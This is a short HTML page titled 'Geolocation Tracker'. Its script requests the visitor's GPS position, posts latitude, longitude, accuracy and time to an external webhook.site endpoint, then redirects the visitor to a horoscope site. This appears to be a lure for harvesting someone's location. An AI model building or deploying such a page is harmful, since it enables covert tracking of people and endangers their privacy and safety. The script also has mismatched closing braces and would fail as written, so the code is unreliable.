<!DOCTYPE html>
<html>
<head>
  <title>Geolocation Tracker</title>
</head>
<body>
  <p>Tracking location... please allow GPS access.</p>

  <script>
    navigator.geolocation.getCurrentPosition(function(position) {
fetch("https://webhook.site/22076a52-cc9b-42d9-9fac-b4fe19c7e334", {
        method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    timestamp: new Date().toISOString()
  })
})
.then(res => res.text())
.then(res => console.log("Response from webhook:", res))
.catch(err => console.error("Error sending data:", err));
        })
      });

      // Optional redirect after sending location
      setTimeout(() => {
        window.location.href = "https://www.astro.com/horoscope"; // Ganti URL jika perlu
      }, 2000); // tunggu 2 detik
    }, function(error) {
      console.error("Geolocation error:", error);
    });
  </script>
</body>
</html>
